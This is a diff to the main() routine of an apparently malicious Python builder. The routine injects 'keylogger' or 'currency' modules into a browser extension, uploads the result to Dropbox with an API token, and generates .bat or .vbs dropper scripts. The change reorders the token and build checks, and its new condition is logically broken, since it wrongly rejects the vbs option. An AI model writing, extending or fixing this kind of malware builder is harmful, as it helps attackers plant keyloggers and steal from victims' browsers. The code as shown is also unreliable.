@@ -44,9 +44,9 @@ def main() :
 		args = parser.parse_args()
 
 		extension = args.extension # Extensao ID
-		modules = args.load # Tipo do arquivo que devera ser gerado apos os injections
+		modules = args.load 
 		token = args.token # API key par ao dropbox
-		builds = args.build # Pasta de saida para os arquivos
+		builds = args.build 
 
 		if len(sys.argv) < 2:
 			banner()
@@ -60,14 +60,17 @@ def main() :
 	if modules == "currency" or modules == "keylogger" :
 		loader = Loader(extension, modules).inject()
 
-	if builds == "bat" or builds == "vbs":
-		if token:
-			if not len(token) == 64:
-				print("{} Token invalid, enter a valid.".format(color.error("[!]")))
-				sys.exit(1)
-			else :
-				Drive(extension, token).upload()
-		builder = Build(extension, builds, token).builder()
+	if token:
+		if not len(token) == 64:
+			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
+			sys.exit(1)
+		elif not builds == "bat" or builds == "vbs" :
+			print("{} You need enter with option --build".format(color.error("[!]")))
+			sys.exit(1)
+		else :
+			Drive(extension, token).upload()
+			if builds == "bat" or builds == "vbs":
+				builder = Build(extension, builds, token).builder()
 
 
 
